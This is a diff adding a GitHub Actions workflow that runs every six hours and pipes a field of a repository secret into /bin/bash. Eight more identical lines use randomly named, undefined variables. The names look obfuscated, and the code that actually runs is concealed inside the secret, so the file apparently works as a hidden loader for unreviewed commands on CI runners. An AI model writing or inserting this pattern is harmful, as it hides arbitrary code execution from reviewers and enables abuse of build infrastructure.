@@ -1,0 +1,24 @@
+name: cuixinjunzhi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: cuixinjunzhi
+        env:
+          pmsvc54: ${{ secrets.pmsvc54 }}
+        run: |
+          echo $pmsvc54 | jq -r .amrhf5 | /bin/bash
+          echo $la7 | jq -r .n71855 | /bin/bash
+          echo $pdprq116 | jq -r .whro762 | /bin/bash
+          echo $vqtz5532 | jq -r .sk8 | /bin/bash
+          echo $jhy35531 | jq -r .uyqs3367 | /bin/bash
+          echo $wnx66635 | jq -r .npdkz1108 | /bin/bash
+          echo $wmcwp162 | jq -r .pf6 | /bin/bash
+          echo $hjxeu0488 | jq -r .c131 | /bin/bash
+          echo $pbvmc7139 | jq -r .mfl9767 | /bin/bash
+
